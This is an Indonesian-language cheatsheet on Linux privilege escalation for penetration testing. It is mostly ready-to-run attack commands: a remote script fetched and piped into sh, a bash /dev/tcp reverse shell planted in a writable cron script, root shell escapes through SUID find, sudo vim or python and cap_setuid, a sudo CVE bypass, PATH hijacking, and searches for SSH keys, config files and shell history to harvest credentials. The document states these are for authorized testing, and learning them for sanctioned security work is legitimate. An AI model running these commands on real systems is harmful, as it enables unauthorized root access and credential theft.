# 🐧 Ultimate Linux Privilege Escalation Cheatsheet

Panduan praktis dan ringkasan lengkap teknik **enumerasi & eskalasi privilege (privilege escalation)** pada sistem Linux setelah mendapatkan akses awal (*low-privilege shell*), untuk keperluan *post-exploitation* dalam *penetration testing*.

---

## 📋 Daftar Isi
1. [Konsep Dasar](#1-konsep-dasar)
2. [Enumerasi Otomatis](#2-enumerasi-otomatis)
3. [Enumerasi Manual — Informasi Sistem](#3-enumerasi-manual--informasi-sistem)
4. [SUID / SGID Binaries](#4-suid--sgid-binaries)
5. [Sudo Misconfiguration](#5-sudo-misconfiguration)
6. [Cron Jobs](#6-cron-jobs)
7. [Kernel Exploit](#7-kernel-exploit)
8. [Linux Capabilities](#8-linux-capabilities)
9. [Writable Files & PATH Hijacking](#9-writable-files--path-hijacking)
10. [Kredensial Tersimpan](#10-kredensial-tersimpan)
11. [Tabel Referensi Command Populer](#11-tabel-referensi-command-populer)

---

## 1. Konsep Dasar

> ⚠️ **PENTING:** Teknik pada berkas ini hanya untuk digunakan pada sistem sendiri atau target yang sudah memiliki izin tertulis untuk diuji (*authorized penetration testing/CTF*).

Alur umum privilege escalation di Linux:

```text
1. Enumerasi otomatis   → Jalankan script (LinPEAS, LES) untuk gambaran cepat
2. Enumerasi manual     → Verifikasi & gali lebih dalam temuan yang mencurigakan
3. Identifikasi vektor  → SUID, sudo, cron, kernel, capabilities, credential, dll
4. Eksploitasi          → Eksekusi teknik yang paling memungkinkan
5. Verifikasi           → Konfirmasi akses root/hak akses baru dengan `id`/`whoami`
```

---

## 2. Enumerasi Otomatis

### 🔹 LinPEAS (Paling Umum Dipakai)
```bash
# Di mesin penyerang (hosting file):
python3 -m http.server 8000

# Di target:
curl http://192.168.1.5:8000/linpeas.sh | sh
```
* **Penjelasan:** LinPEAS memindai sistem secara menyeluruh dan menyorot temuan mencurigakan dengan kode warna (kuning = perlu dicek, merah/kuning-terang = kemungkinan besar dieksploitasi).

### 🔹 Linux Exploit Suggester
```bash
./linux-exploit-suggester.sh
```
* **Penjelasan:** Membandingkan versi kernel target dengan database *known kernel exploits* dan menyarankan CVE yang relevan.

### 🔹 LinEnum
```bash
./LinEnum.sh -t
```
* **`-t`**: Menyertakan pengecekan *thorough* (lebih detail, termasuk file konfigurasi umum).

> 💡 **Tips:** Script otomatis membantu mempercepat proses, tapi jangan hanya mengandalkannya — selalu verifikasi manual temuan penting sebelum dieksploitasi, karena bisa saja ada *false positive*.

---

## 3. Enumerasi Manual — Informasi Sistem

### 🔹 Informasi Kernel & OS
```bash
uname -a
cat /etc/os-release
cat /proc/version
```

### 🔹 Informasi User & Group Aktif
```bash
id
whoami
cat /etc/passwd
groups
```
* **`/etc/passwd`**: Bisa dibaca semua user, berguna untuk melihat daftar user lain yang ada di sistem.

### 🔹 Proses yang Sedang Berjalan
```bash
ps aux
ps -ef --forest
```
* **`--forest`**: Menampilkan hierarki proses (parent-child) dalam bentuk pohon, memudahkan identifikasi proses yang berjalan sebagai root.

### 🔹 Koneksi Jaringan Aktif
```bash
netstat -tulnp
ss -tulnp
```
* **Penjelasan:** Menampilkan port yang sedang listening — kadang ada service internal (misal database) yang hanya bisa diakses dari localhost dan menyimpan celah tambahan.

---

## 4. SUID / SGID Binaries

Binary dengan bit **SUID** (*Set User ID*) akan dijalankan dengan hak akses pemilik file (sering kali root), terlepas dari siapa yang menjalankannya.

### 🔹 Mencari Semua Binary Berbit SUID
```bash
find / -perm -4000 -type f 2>/dev/null
```
* **`-perm -4000`**: Mencari berkas dengan bit SUID aktif.
* **`2>/dev/null`**: Menyembunyikan pesan error "Permission denied" agar output lebih bersih.

### 🔹 Mencari Binary Berbit SGID
```bash
find / -perm -2000 -type f 2>/dev/null
```

### 🔹 Memeriksa Binary yang Ditemukan di GTFOBins
```text
https://gtfobins.github.io/
```
* **Penjelasan:** Setelah menemukan daftar binary SUID, periksa satu per satu di GTFOBins — situs referensi yang mendokumentasikan cara menyalahgunakan binary Unix umum (seperti `find`, `vim`, `awk`, `nmap`) untuk mendapatkan shell atau membaca berkas dengan hak akses lebih tinggi.

### 🔹 Contoh Eksploitasi SUID (find)
```bash
find . -exec /bin/sh -p \; -quit
```
* **Penjelasan:** Jika binary `find` memiliki bit SUID, opsi `-exec` bisa dipakai untuk menjalankan shell dengan hak akses pemilik file tersebut.

---

## 5. Sudo Misconfiguration

### 🔹 Memeriksa Hak Akses Sudo Milik User Saat Ini
```bash
sudo -l
```
* **`-l`**: Menampilkan daftar perintah yang boleh dijalankan user saat ini melalui `sudo`, termasuk apakah butuh password atau tidak (`NOPASSWD`).

### 🔹 Contoh Temuan & Eksploitasi

Jika `sudo -l` menunjukkan user boleh menjalankan binary tertentu sebagai root, cek juga di GTFOBins untuk vektor eskalasinya. Contoh umum:

```bash
# Jika (ALL) NOPASSWD: /usr/bin/vim
sudo vim -c ':!/bin/sh'

# Jika (ALL) NOPASSWD: /usr/bin/python3
sudo python3 -c 'import os; os.system("/bin/sh")'
```
* **Penjelasan:** Banyak binary umum (editor, interpreter, pager) memiliki cara bawaan untuk "keluar" ke shell sistem — jika binary tersebut diizinkan lewat `sudo` tanpa batasan, ini bisa langsung memberi shell root.

### 🔹 Sudo Versi Rentan (CVE-2019-14287 / CVE-2021-3156)
```bash
sudo -u#-1 /bin/bash        # CVE-2019-14287 (Sudo < 1.8.28)
```
* **Penjelasan:** Beberapa versi sudo lama memiliki bug yang memungkinkan bypass pembatasan user meski sudah dikonfigurasi spesifik — selalu cek versi `sudo -V` dan cocokkan dengan CVE yang diketahui.

---

## 6. Cron Jobs

### 🔹 Melihat Cron Job Sistem
```bash
cat /etc/crontab
ls -la /etc/cron.d/ /etc/cron.daily/
```

### 🔹 Mencari Script Cron yang Writable
```bash
find / -writable -path "*cron*" 2>/dev/null
```
* **Penjelasan:** Jika ada script yang dijalankan cron sebagai root namun writable oleh user biasa, script tersebut bisa disisipi perintah berbahaya (misal reverse shell) dan akan otomatis dieksekusi sebagai root pada jadwal berikutnya.

### 🔹 Contoh Eksploitasi
```bash
echo '#!/bin/bash' > /path/ke/script_cron_writable.sh
echo 'bash -i >& /dev/tcp/192.168.1.5/4444 0>&1' >> /path/ke/script_cron_writable.sh
```
* **Penjelasan:** Menyisipkan reverse shell ke script cron yang writable, lalu menunggu jadwal cron berikutnya untuk mendapatkan sesi baru dengan hak akses root.

---

## 7. Kernel Exploit

### 🔹 Memeriksa Versi Kernel
```bash
uname -r
```

### 🔹 Mencari Exploit yang Cocok
```bash
searchsploit linux kernel 5.4
```
* **Penjelasan:** Cocokkan versi kernel dengan exploit yang tersedia di ExploitDB atau hasil dari `linux-exploit-suggester`.

> ⚠️ **Catatan:** Kernel exploit berisiko tinggi menyebabkan *crash* atau ketidakstabilan sistem — gunakan sebagai opsi terakhir setelah vektor lain (SUID, sudo, cron) tidak membuahkan hasil, dan hanya di lingkungan yang sudah diizinkan penuh.

---

## 8. Linux Capabilities

*Capabilities* memberikan sebagian hak akses root ke sebuah binary tanpa perlu bit SUID penuh.

### 🔹 Mencari Binary dengan Capabilities Berbahaya
```bash
getcap -r / 2>/dev/null
```
* **`getcap -r`**: Memindai seluruh sistem untuk mencari binary yang memiliki *capabilities* tertentu.

### 🔹 Contoh Eksploitasi (`cap_setuid`)
```bash
# Jika python3 memiliki cap_setuid+ep
python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
```
* **Penjelasan:** Capability `cap_setuid` memungkinkan proses mengubah UID-nya sendiri menjadi 0 (root) tanpa memerlukan bit SUID pada binary.

---

## 9. Writable Files & PATH Hijacking

### 🔹 Mencari Berkas/Folder yang Writable oleh Semua User
```bash
find / -writable -type d 2>/dev/null
```

### 🔹 Memeriksa Variabel PATH
```bash
echo $PATH
```

### 🔹 PATH Hijacking
```bash
# Jika direktori writable ada di awal $PATH dan sebuah script root memanggil binary tanpa full path (misal "cp" bukan "/bin/cp")
echo '#!/bin/bash' > /tmp/writable_dir/cp
echo '/bin/bash' >> /tmp/writable_dir/cp
chmod +x /tmp/writable_dir/cp
```
* **Penjelasan:** Jika script yang dijalankan root memanggil perintah tanpa path lengkap, dan direktori writable ditempatkan lebih awal di `$PATH`, binary palsu bisa dieksekusi menggantikan binary asli.

---

## 10. Kredensial Tersimpan

### 🔹 Mencari Berkas Berisi Password
```bash
grep -ri "password" /etc/*.conf 2>/dev/null
find / -name "*.txt" -o -name "*.conf" 2>/dev/null | xargs grep -l "password" 2>/dev/null
```

### 🔹 Memeriksa History Command
```bash
cat ~/.bash_history
cat ~/.mysql_history
```
* **Penjelasan:** User sering tidak sengaja mengetik password langsung di command line (misal `mysql -u root -pPassword123`), yang kemudian tersimpan di riwayat perintah.

### 🔹 Memeriksa SSH Key yang Tersimpan
```bash
find / -name "id_rsa" -o -name "id_ed25519" 2>/dev/null
cat ~/.ssh/config
```
* **Penjelasan:** Private key SSH yang tertinggal (misal di direktori backup atau home user lain) bisa langsung dipakai untuk login sebagai user tersebut tanpa password.

### 🔹 Memeriksa Berkas Konfigurasi Aplikasi
```bash
find / -name "wp-config.php" -o -name ".env" -o -name "config.php" 2>/dev/null
```
* **Penjelasan:** Berkas konfigurasi aplikasi web sering menyimpan kredensial database dalam bentuk plaintext.

---

## 11. Tabel Referensi Command Populer

| Command | Fungsi / Deskripsi |
| :--- | :--- |
| `linpeas.sh` | Script enumerasi otomatis paling populer |
| `sudo -l` | Melihat hak akses sudo user saat ini |
| `find / -perm -4000` | Mencari binary dengan bit SUID |
| `find / -perm -2000` | Mencari binary dengan bit SGID |
| `getcap -r /` | Mencari binary dengan Linux capabilities tertentu |
| `uname -r` | Melihat versi kernel (untuk kernel exploit) |
| `cat /etc/crontab` | Melihat jadwal cron job sistem |
| `find / -writable` | Mencari berkas/folder yang writable |
| `cat ~/.bash_history` | Memeriksa riwayat perintah untuk kredensial |
| `find / -name "id_rsa"` | Mencari private key SSH yang tertinggal |
| `gtfobins.github.io` | Referensi eksploitasi binary Unix umum |
| `searchsploit` | Mencari exploit yang cocok dengan versi kernel/software |

---